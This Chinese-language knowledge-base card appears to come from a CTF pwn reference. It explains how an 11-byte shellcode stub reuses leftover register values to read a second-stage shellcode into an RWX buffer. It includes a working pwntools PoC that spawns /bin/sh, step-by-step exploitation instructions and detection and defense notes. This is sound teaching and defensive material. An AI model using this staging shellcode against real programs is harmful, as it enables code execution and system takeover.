---
id: binary-pwn-sandbox-escape-register-reuse-reread-staging
title: 短 shellcode 复用入口寄存器构造 reread：0xb 字节 read(0, RWX, len) 载入二阶段 shellcode
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: register-reuse-reread-staging
tags:
- pwn
- ctf
- shellcode
- staging
- register-reuse
- read
- rwx
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V529
  verified_at: '2026-11-11T15:35:54+08:00'
  notes: 已对照原文与截图 03-06 核对并修正：demo1 现场 RAX=0x20240000/RSI=buf/RDX=0x100/RDI=0，2 字节 xor eax,eax;syscall 即为 read(0,buf,0x100)；demo2 多一次 write(1,a,0) 后实测 RDI=1、RSI=程序地址、RDX=0、R11=0x246（syscall 遗留 RFLAGS），卡内原写 RSI=0x20240000/RDX=R11=0x246/RDI=0 错误，已按截图改为现场值并说明桩用 xor edi,edi、push rax;pop rsi、push r11;pop rdx 重建参数；0xb 字节与图 06 反汇编一致（read(0,0x20240000,0x246)）。与 tiny-shellcode-read-self-loop-staging 区别（无 jmp 回跳、一次性长度对齐衔接）成立，非重复。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-register-reuse-reread-staging/
draft: false
kb_aliases:
- reread shellcode
- 二次读入 shellcode
- 寄存器现场复用
- 0xb 字节 read 桩
- 分段载入 shellcode
- 短 shellcode 扩展
---

## 一句话结论

当题目只允许输入十几个字节的 shellcode 时，不必在第一段里完成全部逻辑：先观察跳转执行前寄存器现场（例如刚执行过 `read`/`write`：`rax` 为间接调用目标/缓冲区地址、`rsi` 指向缓冲区、`rdx` 或 `r11` 可当长度、`rdi` 可能为 0 或已被置 1），用 `push rax; pop rsi; xor edi,edi; push r11; pop rdx; xor eax,eax; syscall` 这样 0xb 字节的桩调用 `read(0, 缓冲区, len)`，把二阶段完整 shellcode 覆盖写回同一缓冲区，再从第一段末尾自然衔接执行二阶段。

## 原理

- **寄存器现场由前序调用决定**：程序在跳转执行 shellcode 前通常刚做过 `read(0, buf, 0x100)` 或 `write(1, buf, n)`。以原文两个 demo 为例：
  - demo1 跳转时 `RAX=0x20240000`（mmap 缓冲区地址，来自 `movabs`）、`RSI=0x20240000`、`RDX=0x100`、`RDI=0`；
  - demo2 多了一次 `write(1,a,0)`，跳转时 `RAX=0x20240000`、`R11=0x246`（上一次 syscall 遗留的 RFLAGS 值，可当长度用）、`R10=0x77`；而 `RDI=1`、`RSI=程序内地址`、`RDX=0` 已被 `write` 调用破坏（原文截图现场），所以桩要用 `xor edi,edi` 清 fd、`push rax; pop rsi` 取缓冲区、`push r11; pop rdx` 取长度。
- **构造 read 只需补齐参数**：`read` 系统调用号 0 → `xor eax,eax`；fd=0 → `xor edi,edi` 或沿用；buf → `push rax; pop rsi`（把缓冲区地址搬到 `rsi`）；count → `push r11; pop rdx`。全部是单字节 `push/pop`/`xor` 指令，合计 0xb 字节：
  `push rax; pop rsi; xor edi,edi; push r11; pop rdx; xor eax,eax; syscall`。
- **覆盖自身后的执行衔接**：第一段恰好 0xb 字节，`syscall` 是最后一条指令；`read` 返回时 RIP 指向第一段末尾（缓冲区 + 0xb）。第二次发送的数据按 `b'a'*0xb + 完整 shellcode` 布局，前 0xb 字节覆盖第一段，偏移 0xb 起是二阶段 shellcode，正好从 RIP 处开始执行。
- **为什么能成立**：`read` 的目标地址与 shellcode 所在缓冲区相同且可写可执行（RWX mmap/BSS）；`read` 的返回地址由第一段长度精确决定；`rax` 在间接调用时被装入缓冲区地址，`r11` 保留 syscall 写入的 RFLAGS 值（如 0x246）可作长度，其他参数即使被前序调用污染也可用单字节指令重建。
- **与 10 字节自覆盖循环的区别**：本卡不做 `jmp $-N` 回跳，而是利用"第一段长度 = read 返回后的落点偏移"一次性衔接到二阶段；无需第二段再自覆盖，适合只允许一次短输入、但后续还能再读一次的题目。

## 触发条件

- 程序把用户输入读入 RWX 缓冲区（mmap 7/33 或 BSS+`mprotect`）后直接跳转执行。
- 跳转时寄存器现场可预测：`rax` 指向缓冲区（间接调用目标），`rdx` 或 `r11` 可作长度；`rdi`、`rsi`、`rdx` 即使被前序调用污染，也能用少量单字节指令重建。
- 程序在 shellcode 执行期间仍允许再次 `read`（`read` 未被 seccomp 禁用），且攻击者能继续发送数据。
- 首段长度可精确控制（不超过题目限制，本例 0xb ≤ 10 的限制需配合负数长度绕过或题目本身放宽）。

## 利用步骤

1. 在调试器中于 `call rax`/`jmp rsp` 前断下，记录全部寄存器：重点 `rax`、`rsi`、`rdx`、`r11`、`rdi`。
2. 按现场写最短 read 桩：若 `rax`=缓冲区、`r11`=长度，则 `push rax; pop rsi; xor edi,edi; push r11; pop rdx; xor eax,eax; syscall`。
3. 计算首段字节数（本例 0xb），确保 `syscall` 后 RIP 落在缓冲区 + 0xb。
4. 第一次发送首段；等待程序进入 `read` 阻塞。
5. 第二次发送 `b'a' * 首段长度 + 完整 shellcode`：前段覆盖首段代码，shellcode 从偏移首段长度处开始，`read` 返回后直接执行。
6. getshell 或按 seccomp 限制改用 ORW 二阶段。

## PoC

```python
from pwn import *
context(log_level='debug', os='linux', arch='amd64')
io = process('./test2')   # mmap(0x20240000,0x1000,7,...); read(0,p,0x100); write(1,a,0); call p

shellcode = asm('''
    mov rbx, 0x0068732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi,esi
    xor edx,edx
    push 59
    pop rax
    syscall
''')
rea = asm('''
    push rax
    pop rsi
    xor edi,edi
    push r11
    pop rdx
    xor eax,eax
    syscall
''')
assert len(rea) == 0xb
io.sendafter(':\n', rea)          # 第一段：read(0, 0x20240000, r11)
io.send(b'a' * len(rea) + shellcode)  # 二阶段：覆盖首段，shellcode 从 +0xb 开始
io.interactive()
```

## 变体与关联

- 变体一：寄存器不理想时用 `push/pop`/`xchg` 调整，例如 `push rsi; pop rdi` 传缓冲区、`mov dl,0xff` 设定长度；每多一条指令就多一字节，需与长度上限权衡。
- 变体二：把二阶段读到另一个已知 RWX 地址（如 BSS）而非覆盖自身，首段末尾用 `push addr; ret` 跳过去。
- 变体三：若 `read` 被 seccomp 禁用，改用 `mmap`/`mprotect` 或 `recvfrom` 等等价输入调用。
- 关联：[[binary-pwn-sandbox-escape-tiny-shellcode-read-self-loop-staging]]（10 字节自覆盖 + `jmp $-N` 循环分段；本卡是一次性长度对齐衔接、不做回跳）、[[binary-pwn-sandbox-escape-scanf-signed-negative-length-bypass]]（首段长度来源被长度检查限制时可配合）、[[binary-pwn-format-string-hn-rwx-mmap-shellcode-staging]]（RWX mmap 上的 shellcode staging）。
- 边界：跳转时寄存器值因编译器/优化级别/前序调用而异，必须实测；二阶段若写到同一地址会覆盖正在执行的代码，首段长度必须与返回落点严格一致；可执行页不可写时本手法失败。

## 检测与防御

- 检测：可执行缓冲区在执行期间被再次 `read` 覆盖；shellcode 中出现连续的 `push/pop`/`xor` 后紧跟 `syscall` 的 read 桩；进程短时间接收两段数据并在第二段进入 execve/ORW。
- 防御：输入页使用 W^X（写入后 `mprotect` 为 RX），禁止执行中再次写入；seccomp 限制 `read`/`recvfrom` 等输入调用；一次读入最大长度并检查返回值。
- 加固：ASLR/PIE 使寄存器指向的缓冲区地址不可预测；限制跳转前寄存器残留（编译器插桩清零），但成本较高。
